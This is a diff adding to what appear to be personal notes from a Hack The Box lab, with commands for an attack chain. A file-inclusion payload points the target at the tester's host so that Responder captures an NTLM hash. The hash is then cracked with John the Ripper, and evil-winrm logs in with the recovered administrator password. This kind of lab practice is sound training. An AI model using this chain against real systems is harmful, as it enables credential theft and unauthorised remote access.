@@ -23,4 +23,25 @@ dir : Uses directory/file enumeration mode.
 -x : File extension(s) to search for. (php/html)
 ```
 
+# Responder:
+```shell
+sudo responder -I {network_interface} 
+http://unika.htb/?page=//10.10.14.25/somefile
+```
 
+# John the riper:
+```shell
+john -w=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+#evil-winrm
+```shell
+evil-winrm -i 10.129.136.91 -u administrator -p badminton
+```
+
+# Acronyms
+
+WinRM, is a Windows-native built-in remote management protocol. port: 5985
+NTLM: New Technology LAN Manager
+LFI: Local File inclusion // File Inclusion Vulnerability // https://www.php.net/manual/en/function.include.php 
+RFI: Remote File Inclusion // File Inclusion Vulnerability // https://www.php.net/manual/en/function.include.php
